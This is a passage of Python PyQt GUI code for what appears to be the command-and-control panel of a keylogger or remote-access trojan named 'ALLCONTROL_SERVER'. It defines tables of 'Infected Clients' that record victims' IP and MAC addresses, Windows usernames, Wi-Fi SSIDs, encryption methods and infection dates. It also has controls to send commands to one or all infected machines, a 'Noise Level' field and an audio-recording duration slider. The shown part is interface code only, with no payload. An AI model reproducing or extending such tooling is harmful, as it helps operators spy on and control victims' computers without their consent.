            audioDurationSlider.setOrientation(Qt.Horizontal)
            value_label = QLabel('1', self)
            value_label.setFont(self.font)
            audioDurationSlider.valueChanged.connect(lambda : self.updateLabel(value_label, f'{audioDurationSlider.value()} seconds'))
            audioDurationSlider.setMinimum(1)
            audioDurationSlider.setMaximum(600)
            audioDurationSlider.setFont(self.font)


            self.commandParametersWidget.layout().addWidget(audioDurationNameLabel, 0, 0)
            self.commandParametersWidget.layout().addWidget(audioDurationSlider, 0, 1)
            self.commandParametersWidget.layout().addWidget(value_label, 0, 2)

            self.commandParametersForm[command_parameter[1]] = audioDurationSlider  # Appends record to dictionary.

    def clearWidgets(self):
        for widget in self.commandParametersWidget.findChildren(QWidget):
            #self.widget.setParent(None)
            widget.deleteLater()

    def retranslateUi(self):
        self.setWindowTitle(QCoreApplication.translate("ALLCONTROL_SERVER", u"MainWindow", None))
        self.keyloggerServerConnectedLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Keylogger Server Connections", None))
        ___qtablewidgetitem = self.connectedClientsKeyloggerServer.horizontalHeaderItem(0)
        ___qtablewidgetitem.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_id", None));
        ___qtablewidgetitem1 = self.connectedClientsKeyloggerServer.horizontalHeaderItem(1)
        ___qtablewidgetitem1.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_address", None));
        ___qtablewidgetitem2 = self.connectedClientsKeyloggerServer.horizontalHeaderItem(2)
        ___qtablewidgetitem2.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"sID", None));
        self.infectedClientsLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Infected Clients", None))
        ___qtablewidgetitem3 = self.infectedClients.horizontalHeaderItem(0)
        ___qtablewidgetitem3.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_id", None));
        ___qtablewidgetitem4 = self.infectedClients.horizontalHeaderItem(1)
        ___qtablewidgetitem4.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"sID", None));
        ___qtablewidgetitem5 = self.infectedClients.horizontalHeaderItem(2)
        ___qtablewidgetitem5.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"mac_address", None));
        ___qtablewidgetitem6 = self.infectedClients.horizontalHeaderItem(3)
        ___qtablewidgetitem6.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_ip", None));
        ___qtablewidgetitem7 = self.infectedClients.horizontalHeaderItem(4)
        ___qtablewidgetitem7.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"infected_date", None));
        ___qtablewidgetitem8 = self.infectedClients.horizontalHeaderItem(5)
        ___qtablewidgetitem8.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"windows_username", None));
        ___qtablewidgetitem9 = self.infectedClients.horizontalHeaderItem(6)
        ___qtablewidgetitem9.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"os_info", None));
        ___qtablewidgetitem10 = self.infectedClients.horizontalHeaderItem(7)
        ___qtablewidgetitem10.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"system_manufacturer", None));
        ___qtablewidgetitem11 = self.infectedClients.horizontalHeaderItem(8)
        ___qtablewidgetitem11.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"ssid", None));
        ___qtablewidgetitem12 = self.infectedClients.horizontalHeaderItem(9)
        ___qtablewidgetitem12.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"net_user_name", None));
        ___qtablewidgetitem13 = self.infectedClients.horizontalHeaderItem(10)
        ___qtablewidgetitem13.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"name_net_card", None));
        ___qtablewidgetitem14 = self.infectedClients.horizontalHeaderItem(11)
        ___qtablewidgetitem14.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"auth_method", None));
        ___qtablewidgetitem15 = self.infectedClients.horizontalHeaderItem(12)
        ___qtablewidgetitem15.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"cipher_method", None));
        ___qtablewidgetitem16 = self.infectedClients.horizontalHeaderItem(13)
        ___qtablewidgetitem16.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"radio_type", None));
        ___qtablewidgetitem17 = self.infectedClients.horizontalHeaderItem(14)
        ___qtablewidgetitem17.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"cpu_arch", None));
        ___qtablewidgetitem18 = self.infectedClients.horizontalHeaderItem(15)
        ___qtablewidgetitem18.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"cpu_name", None));
        ___qtablewidgetitem19 = self.infectedClients.horizontalHeaderItem(16)
        ___qtablewidgetitem19.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"timezone", None));
        self.commandServerConnectedLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Command Server Connections", None))
        ___qtablewidgetitem20 = self.connectedClientsCommandServer.horizontalHeaderItem(0)
        ___qtablewidgetitem20.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_id", None));
        ___qtablewidgetitem21 = self.connectedClientsCommandServer.horizontalHeaderItem(1)
        ___qtablewidgetitem21.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_address", None));
        ___qtablewidgetitem22 = self.connectedClientsCommandServer.horizontalHeaderItem(2)
        ___qtablewidgetitem22.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"name", None));
        self.label.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Info", None))
        ___qtablewidgetitem23 = self.infoTable.verticalHeaderItem(0)
        ___qtablewidgetitem23.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Command Server Status", None));
        ___qtablewidgetitem24 = self.infoTable.verticalHeaderItem(1)
        ___qtablewidgetitem24.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Keylogger Server Status", None));
        ___qtablewidgetitem25 = self.infoTable.verticalHeaderItem(2)
        ___qtablewidgetitem25.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Command Server IP & Port", None));
        ___qtablewidgetitem26 = self.infoTable.verticalHeaderItem(3)
        ___qtablewidgetitem26.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Keylogger Server IP & Port", None));
        self.securityLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Security Info", None))
        ___qtablewidgetitem27 = self.securityTable.horizontalHeaderItem(0)
        ___qtablewidgetitem27.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Date", None));
        ___qtablewidgetitem28 = self.securityTable.horizontalHeaderItem(1)
        ___qtablewidgetitem28.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Message", None));
        self.logsLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Logs", None))
        ___qtablewidgetitem29 = self.logsTable.horizontalHeaderItem(0)
        ___qtablewidgetitem29.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"date", None));
        ___qtablewidgetitem30 = self.logsTable.horizontalHeaderItem(1)
        ___qtablewidgetitem30.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Source", None));
        ___qtablewidgetitem31 = self.logsTable.horizontalHeaderItem(2)
        ___qtablewidgetitem31.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"message", None));
        self.bannerLabel.setText("")
        self.tabs.setTabText(self.tabs.indexOf(self.Dashboard), QCoreApplication.translate("ALLCONTROL_SERVER", u"Dashboard", None))
        self.connectedClientsLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Connected Clients", None))
        ___qtablewidgetitem32 = self.connectedClients.horizontalHeaderItem(0)
        ___qtablewidgetitem32.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_id", None));
        ___qtablewidgetitem33 = self.connectedClients.horizontalHeaderItem(1)
        ___qtablewidgetitem33.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"sID", None));
        ___qtablewidgetitem34 = self.connectedClients.horizontalHeaderItem(2)
        ___qtablewidgetitem34.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"mac_address", None));
        ___qtablewidgetitem35 = self.connectedClients.horizontalHeaderItem(3)
        ___qtablewidgetitem35.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"client_ip", None));
        ___qtablewidgetitem36 = self.connectedClients.horizontalHeaderItem(4)
        ___qtablewidgetitem36.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"infected_date", None));
        ___qtablewidgetitem37 = self.connectedClients.horizontalHeaderItem(5)
        ___qtablewidgetitem37.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"windows_username", None));
        ___qtablewidgetitem38 = self.connectedClients.horizontalHeaderItem(6)
        ___qtablewidgetitem38.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"os_info", None));
        ___qtablewidgetitem39 = self.connectedClients.horizontalHeaderItem(7)
        ___qtablewidgetitem39.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"system_manufacturer", None));
        ___qtablewidgetitem40 = self.connectedClients.horizontalHeaderItem(8)
        ___qtablewidgetitem40.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"ssid", None));
        ___qtablewidgetitem41 = self.connectedClients.horizontalHeaderItem(9)
        ___qtablewidgetitem41.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"net_user_name", None));
        ___qtablewidgetitem42 = self.connectedClients.horizontalHeaderItem(10)
        ___qtablewidgetitem42.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"name_net_card", None));
        ___qtablewidgetitem43 = self.connectedClients.horizontalHeaderItem(11)
        ___qtablewidgetitem43.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"auth_method", None));
        ___qtablewidgetitem44 = self.connectedClients.horizontalHeaderItem(12)
        ___qtablewidgetitem44.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"cipher_method", None));
        ___qtablewidgetitem45 = self.connectedClients.horizontalHeaderItem(13)
        ___qtablewidgetitem45.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"radio_type", None));
        ___qtablewidgetitem46 = self.connectedClients.horizontalHeaderItem(14)
        ___qtablewidgetitem46.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"cpu_arch", None));
        ___qtablewidgetitem47 = self.connectedClients.horizontalHeaderItem(15)
        ___qtablewidgetitem47.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"cpu_name", None));
        ___qtablewidgetitem48 = self.connectedClients.horizontalHeaderItem(16)
        ___qtablewidgetitem48.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"timezone", None));
        self.valueLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Value:", None))
        self.fieldLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Field:", None))
        self.applyButton.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Apply", None))
        self.textEdit.setPlaceholderText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Enter value to find connected clients", None))
        self.scheduledCommandsLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Scheduled Commands", None))
        self.optionsGroupBox.setTitle(QCoreApplication.translate("ALLCONTROL_SERVER", u"Options", None))
        self.sendToAllCheckBox.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Send to all", None))
        self.targetLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Target (Client ID):", None))
        self.commandGroupBox.setTitle(QCoreApplication.translate("ALLCONTROL_SERVER", u"Command", None))
        self.commandNameLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Name:", None))
        self.commandDescriptionLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Description:", None))
        self.noiseLevelLabel.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Noise Level:", None))
        self.sendCommandButton.setText(QCoreApplication.translate("ALLCONTROL_SERVER", u"Send", None))
        self.commandParametersGroupBox.setTitle(QCoreApplication.translate("ALLCONTROL_SERVER", u"Command Parameters", None))
        self.previewControls.setTitle("")
        self.tabs.setTabText(self.tabs.indexOf(self.Operations), QCoreApplication.translate("ALLCONTROL_SERVER", u"Operations", None))
        self.tabs.setTabText(self.tabs.indexOf(self.database), QCoreApplication.translate("ALLCONTROL_SERVER", u"Database", None))
        self.tabs.setTabText(self.tabs.indexOf(self.Configurations), QCoreApplication.translate("ALLCONTROL_SERVER", u"Configurations", None))
        self.tabs.setTabText(self.tabs.indexOf(self.Logs), QCoreApplication.translate("ALLCONTROL_SERVER", u"Logs", None))
        self.logoFooterLabel.setText("")
    # retranslateUi

